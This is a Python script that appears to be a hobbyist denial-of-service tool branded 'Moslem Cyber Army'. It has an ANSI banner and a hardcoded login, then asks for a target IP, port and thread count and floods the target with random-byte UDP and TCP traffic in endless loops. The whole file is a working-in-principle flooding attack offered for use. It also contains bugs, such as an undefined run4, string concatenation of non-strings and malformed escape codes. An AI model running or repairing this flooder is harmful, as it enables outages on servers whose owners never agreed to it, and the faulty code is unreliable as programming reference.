# -*- coding: utf-8 -*-
import logging
import random
import socket
import threading
import os
import sys
import time
os.system("clear")

# Colors
class bcolors:
    KUN = '\033[95m'
    FAYAKUN = "\033[37m"

attemps = 0
os.system("clear")
print("""
\033[37m
\033[32m╔═══════════════\033[31m▓▓▓▓▓▓▓\033[32m══════════════════\033[33m▓▓\033[32m═════\033[33m▓▓\033[32m═══════════╗
\033[32m║\033[94m          ▓▓▓▓▓▓▓  \033[31m   ▓▓        \033[97m▓▓▓▓▓▓▓\033[33m ▓▓     ▓▓           \033[32m║
\033[32m║\033[94m         ▓▓    \033[31m▓▓      ▓▓      \033[97m▓▓      \033[33m ▓▓     ▓▓           \033[32m║
\033[32m║\033[94m         ▓▓    \033[31m▓▓     ▓▓  \033[36m▓▓▓  \033[97m▓▓      \033[33m ▓▓▓▓▓▓ ▓▓           \033[32m║
\033[32m║\033[94m         ▓▓    \033[31m▓▓▓▓▓▓▓   \033[36m▓▓ ▓▓  \033[97m▓▓▓▓▓▓▓\033[33m ▓▓     ▓▓           \033[32m║
\033[32m║\033[94m         ▓▓    \033[31m▓▓     ▓▓\033[36m▓▓   ▓▓       \033[97m▓▓\033[33m▓▓     ▓▓           \033[32m║
\033[32m║\033[94m          ▓▓▓▓▓▓▓      \033[36m▓▓     ▓▓\033[97m▓▓▓▓▓▓▓                     \033[32m║ 
\033[32m║\033[36m                      ▓▓▓▓▓▓▓▓▓▓▓                           \033[32m║
\033[32m║\033[36m                     ▓▓         ▓▓                          \033[32m║
\033[32m╚════════════════════════════════════════════════════════════╝
\033[94m╔════════════════════════════════════════════════════════════╗
\033[94m║\033[36m           Design By: KunFay//github.com/KunFay99           \033[94m║
\033[94m╚════════════════════════════════════════════════════════════╝
""")
while attemps < 100:
    username = input('\033[33m Enter your username: \033[0m')
    password = input('\033[33m Enter your password: \033[0m')
    
    if username == 'kun' and password == 'fayakun':
        print("\033[32m-------$ELAMAT DATANG DI ZONA MOSLEM CYBER ARMY------")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

ip = str(input("\033[37m Target IP : \033[0m"))
port = int(input("\033[37m Target Port : \033[0m"))
choice = str(input("\033[37m (y/n) : \033[0m"))
times = int(input("\033[37m Time : \033[0m"))
threads = int(input("\033[37m Threads : \033[0m"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[+]","[*]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +str(ip)+ " \033[32m" +(random)+ "")
			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[37m" +(times)+ "")
		except:
			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[30mServer meybe down..!\033[0m")
				
def run2():
	data = random._urandom(999)
	i = random.choice(("[+]","[*]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +str(ip)+ " \033[32m" +(random)+ "")
			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[37m" +(times)+ "")
		except:
			s.close()
			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[30mServer meybe down..!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[+]","[*]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +str(ip)+ " \033[32m" +(random)+ "")
			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[37m" +(times)+ "")
		except:
			s.close()
			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[30mServer meybe down..!\033[0m")
				
							
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		
else:
		th = threading.Thread(target = run4)
		th.start()
